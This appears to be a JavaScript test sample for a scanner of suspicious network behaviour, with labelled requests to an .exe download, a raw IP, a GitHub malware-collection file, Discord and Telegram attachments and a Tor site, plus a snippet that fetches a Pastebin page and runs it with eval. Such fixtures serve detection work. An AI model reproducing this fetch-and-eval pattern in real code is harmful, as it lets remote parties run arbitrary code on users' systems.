req = new XMLHttpRequest();

var dangerous_file_extension = "https://www.seniorenakademie-berlin.de/images/open_air.exe";
var hardcoded_ip = "https://172.115.12.456/some_path";
var github_raw = "https://raw.githubusercontent.com/HynekPetrak/javascript-malware-collection/master/2017/20170507/20170507_0d258992733e8a397617eae0cbb08acc";
var discord_attachment = "https://cdn.discordapp.com/attachments/763533415973762261/925208250345933652/awesome";
var telegram_attachment = "https://api.telegram.org/file/90uf90dj8dsu8if09dsi90fds9/suspicious_file";
var tor_resource = "http://zlibrary24tuxziyiyfr7zd46ytefdqbqd2axkmxm4o5374ptpc52fad.onion/";

req.open(GET, dangerous_file_extension, false);
req.open(GET, hardcoded_ip, false);
req.open(GET, github_raw, false);
req.open(GET, discord_attachment, false);
req.open(GET, telegram_attachment, false);
req.open(GET, tor_resource, false);


import fetch from 'node-fetch';
const getIPAddress = async () => {
    const request = await fetch("https://api.ipify.org");
    let ip = "";
    if (request.ok) {
        ip = await request.text();
    }

    return ip;
};

const axios = require("axios")
const url = "https://pastebin.com/raw/nFwnnJ98";
(async () => {
    const res = await axios.get(url);
    eval(res.data)
})
